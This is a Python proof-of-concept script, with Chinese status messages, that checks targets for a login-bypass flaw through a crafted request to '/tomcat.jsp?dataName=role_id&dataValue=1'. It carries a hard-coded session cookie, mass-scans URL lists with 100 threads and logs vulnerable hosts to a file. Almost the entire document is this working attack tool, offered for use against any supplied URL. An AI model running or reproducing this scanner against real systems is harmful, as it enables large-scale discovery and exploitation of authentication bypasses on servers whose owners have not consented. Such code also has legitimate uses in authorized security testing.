import requests, argparse, re, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

 __    __  __       __        __                            __        __                                  __           
/  |  /  |/  |  _  /  |      /  |                          /  |      /  |                                /  |          
$$ |  $$ |$$ | / \ $$ |      $$ |  ______    ______    ____$$ |      $$ |____   __    __         ______  $$/   ______  
$$ |__$$ |$$ |/$  \$$ |      $$ | /      \  /      \  /    $$ |      $$      \ /  |  /  |       /      \ /  | /      \ 
$$    $$ |$$ /$$$  $$ |      $$ |/$$$$$$  | $$$$$$  |/$$$$$$$ |      $$$$$$$  |$$ |  $$ |      /$$$$$$  |$$ |/$$$$$$  |
$$$$$$$$ |$$ $$/$$ $$ |      $$ |$$ |  $$ | /    $$ |$$ |  $$ |      $$ |  $$ |$$ |  $$ |      $$ |  $$ |$$ |$$    $$ |
$$ |  $$ |$$$$/  $$$$ |      $$ |$$ \__$$ |/$$$$$$$ |$$ \__$$ |      $$ |__$$ |$$ \__$$ |      $$ |__$$ |$$ |$$$$$$$$/ 
$$ |  $$ |$$$/    $$$ |      $$ |$$    $$/ $$    $$ |$$    $$ |      $$    $$/ $$    $$ |      $$    $$/ $$ |$$       |
$$/   $$/ $$/      $$/       $$/  $$$$$$/   $$$$$$$/  $$$$$$$/       $$$$$$$/   $$$$$$$ |      $$$$$$$/  $$/  $$$$$$$/ 
                                                                               /  \__$$ |      $$ |                    
                                                                               $$    $$/       $$ |                    
                                                                                $$$$$$/        $$/                     
  
                                                                                                @author: black apple pie
                                                                                                @version: 0.0.1
"""
    print(banner)

#poc
def poc(target):
    url = target + "/tomcat.jsp?dataName=role_id&dataValue=1"
    headers = {
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "route=9ace4ae38d055850b02837327c3007b6; JSESSIONID=10DC13C3E7D76DBBA9AA5BAD02BC2856.jvm4; Secure",
        "Connection": "close"
    }

    res = requests.get(url=url, headers=headers, verify=False, timeout=5)

    try:
        if 'id' in res.text:
            print("[+]" + target + "存在登录绕过漏洞")
            with open('load.txt', 'a', encoding='utf-8') as f:
                f.write(target + "存在登录绕过漏洞")
        else:
            print("[-]" + target + "不存在登录绕过漏洞")
    except Exception as e:
        print(e)

#main
def main():
    banner()

    parser = argparse.ArgumentParser(description='this is a canal pass poc')

    #添加参数
    parser.add_argument('-u', '--url', dest='url', help='input attack url', type=str)
    parser.add_argument('-f', '--file', dest='file', help='url.txt', type=str)

    #调用
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


#调用
if __name__ == '__main__':
    main()